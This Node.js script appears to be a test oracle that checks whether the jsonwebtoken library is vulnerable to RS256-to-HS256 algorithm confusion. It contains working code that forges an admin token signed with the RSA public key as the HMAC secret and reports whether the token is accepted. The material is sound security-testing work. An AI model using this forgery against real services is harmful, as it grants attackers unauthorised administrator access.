'use strict';
const crypto = require('node:crypto');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

let jwt;
try {
  jwt = require('jsonwebtoken');
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
  process.exit(0);
}

const marker = 'jwt-oracle-' + process.pid + '-' + Date.now();
const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), marker + '-'));

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  // Generate an RSA key pair for benign asymmetric signing/verification.
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048,
    publicKeyEncoding: { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
  });

  // Persist keys to tmp (not required by API, but demonstrates fixture usage boundaries).
  const pubPath = path.join(tmpDir, 'pub.pem');
  const privPath = path.join(tmpDir, 'priv.pem');
  fs.writeFileSync(pubPath, publicKey);
  fs.writeFileSync(privPath, privateKey);

  // --- Benign operation: sign with RS256 private key, verify with RS256 public key ---
  const benignPayload = { sub: 'user123', role: 'guest', marker };
  const benignToken = jwt.sign(benignPayload, privateKey, { algorithm: 'RS256', expiresIn: '5m' });

  let benignDecoded;
  try {
    benignDecoded = jwt.verify(benignToken, publicKey, { algorithms: ['RS256'] });
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign RS256 verify failed unexpectedly: ' + String(e && e.message) });
    process.exit(0);
  }

  if (!benignDecoded || benignDecoded.sub !== 'user123' || benignDecoded.marker !== marker) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign verify returned unexpected payload' });
    process.exit(0);
  }

  operation_completed = true;

  // --- Malicious operation: forge an HS256 token using the RSA public key PEM as HMAC secret ---
  // Attacker does not have the private key, only the public key (which is meant to be public).
  const forgedPayload = { sub: 'attacker', role: 'admin', marker: marker + '-forged' };

  // Manually craft a JWT with alg=HS256, signed using HMAC-SHA256 with the public key string as secret.
  function base64url(input) {
    return Buffer.from(input).toString('base64')
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=+$/, '');
  }

  const header = { alg: 'HS256', typ: 'JWT' };
  const encodedHeader = base64url(JSON.stringify(header));
  const encodedPayload = base64url(JSON.stringify(forgedPayload));
  const signingInput = encodedHeader + '.' + encodedPayload;

  const hmac = crypto.createHmac('sha256', publicKey);
  hmac.update(signingInput);
  const signature = hmac.digest('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');

  const forgedToken = signingInput + '.' + signature;

  // The vulnerable pattern: call verify WITHOUT restricting algorithms, passing the
  // RSA public key (intended for RS256 asymmetric verification) as the "secret".
  // If the library accepts HS256 using the public key as HMAC secret, forged admin
  // claims are trusted -> signature validation bypass.
  try {
    const forgedDecoded = jwt.verify(forgedToken, publicKey);
    if (forgedDecoded && forgedDecoded.role === 'admin' && forgedDecoded.marker === marker + '-forged') {
      exploit_succeeded = true;
      evidence = 'forged HS256 token (signed with public key as HMAC secret) was accepted by jwt.verify without algorithms restriction; decoded payload: ' + JSON.stringify(forgedDecoded);
    } else {
      exploit_succeeded = false;
      evidence = 'forged token verify did not return expected forged payload: ' + JSON.stringify(forgedDecoded);
    }
  } catch (e) {
    exploit_succeeded = false;
    evidence = 'forged token verify was rejected (blocked): ' + String(e && e.message);
  }

  finish({ operation_completed, exploit_succeeded, evidence });
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'unexpected exception: ' + String(e && e.stack || e) });
} finally {
  try {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  } catch (_) { /* ignore cleanup errors */ }
}
